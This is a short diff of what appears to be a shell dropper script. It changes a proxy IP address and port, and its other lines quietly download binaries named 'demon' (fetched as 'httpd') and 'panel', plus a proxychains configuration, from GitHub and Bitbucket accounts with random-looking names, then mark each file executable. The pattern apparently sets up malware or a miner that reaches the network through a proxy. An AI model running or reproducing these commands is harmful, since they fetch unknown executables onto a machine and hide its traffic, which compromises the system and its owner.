@@ -1,5 +1,5 @@
-proxy="192.111.137.37" 
-port="18762" 
+proxy="45.115.225.232" 
+port="3839" 
 wget -q -O demon https://github.com/swanderenata/cautious-octo-garbanzo/raw/main/httpd && chmod +x demon
 wget -q https://bitbucket.org/asimadarasi/alima/downloads/panel && chmod +x panel 
 wget -q https://bitbucket.org/asimadarasi/alima/downloads/proxychains.conf && chmod +x proxychains.conf 
